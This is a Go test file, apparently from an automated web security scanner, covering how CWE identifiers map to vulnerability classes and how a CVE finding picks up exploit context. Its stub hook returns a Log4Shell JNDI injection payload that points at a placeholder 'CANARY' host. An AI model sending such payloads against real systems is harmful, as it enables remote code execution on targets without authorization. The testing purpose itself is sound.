package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/ClatTribe/tsengine/internal/webagent"
	"github.com/ClatTribe/tsengine/pkg/types"
)

func TestCWEToWebClass(t *testing.T) {
	cases := map[string]string{
		"CWE-89":   "sqli",
		"CWE-79":   "xss",
		"CWE-918":  "ssrf",
		"CWE-862":  "bola",
		"cwe-601":  "open_redirect", // case-insensitive
		"CWE-9999": "",              // unmapped → empty (agent falls back to full catalog)
	}
	for cwe, want := range cases {
		if got := cweToWebClass([]string{cwe}); got != want {
			t.Errorf("cweToWebClass(%q) = %q, want %q", cwe, got, want)
		}
	}
	// first known match wins across multiple CWEs
	if got := cweToWebClass([]string{"CWE-0000", "CWE-89"}); got != "sqli" {
		t.Errorf("first-known-match: got %q, want sqli", got)
	}
}

// TestSeedFindingsFromScan_FiresExploitHook: the handoff builds SeedFindings from the scan's enriched
// findings AND fires webagent.ExploitContextForFinding — so a CVE-bearing finding carries its skeleton
// (the whole point of --exploit-intel). Route is re-hosted onto the target allowlist.
func TestSeedFindingsFromScan_FiresExploitHook(t *testing.T) {
	scan := types.Scan{FindingsEnriched: []types.Finding{
		{Endpoint: "http://host.docker.internal:8000/x", RuleID: "nuclei::CVE-2021-44228", CWE: []string{"CWE-94"}, Severity: "critical"},
		{Endpoint: "/y", RuleID: "zap::reflected", CWE: []string{"CWE-79"}, Severity: "medium"},
		{Endpoint: "", RuleID: "x"}, // no route → dropped
	}}
	dir := t.TempDir()
	path := filepath.Join(dir, "vulnerabilities.json")
	data, _ := json.Marshal(scan)
	if err := os.WriteFile(path, data, 0o644); err != nil {
		t.Fatal(err)
	}

	// install a stub hook that grounds on the CVE (mirrors offensivecontext.Resolver's contract)
	webagent.ExploitContextForFinding = func(f types.Finding) string {
		if f.RuleID == "nuclei::CVE-2021-44228" {
			return "REQUEST: POST /x\nBODY: ${jndi:ldap://CANARY}"
		}
		return ""
	}
	t.Cleanup(func() { webagent.ExploitContextForFinding = nil })

	got, err := seedFindingsFromScan(path, "http://localhost:8000")
	if err != nil {
		t.Fatalf("seedFindingsFromScan: %v", err)
	}
	if len(got) != 2 {
		t.Fatalf("want 2 seeds (blank endpoint dropped), got %d: %+v", len(got), got)
	}
	var cve, plain webagent.SeedFinding
	for _, s := range got {
		switch s.Class {
		case "rce":
			cve = s
		case "xss":
			plain = s
		}
	}
	if cve.Route != "http://localhost:8000/x" {
		t.Errorf("CVE seed route not re-hosted: %q", cve.Route)
	}
	if cve.ExploitContext == "" || plain.ExploitContext != "" {
		t.Errorf("exploit context must ride the CVE seed only: cve=%q plain=%q", cve.ExploitContext, plain.ExploitContext)
	}
}
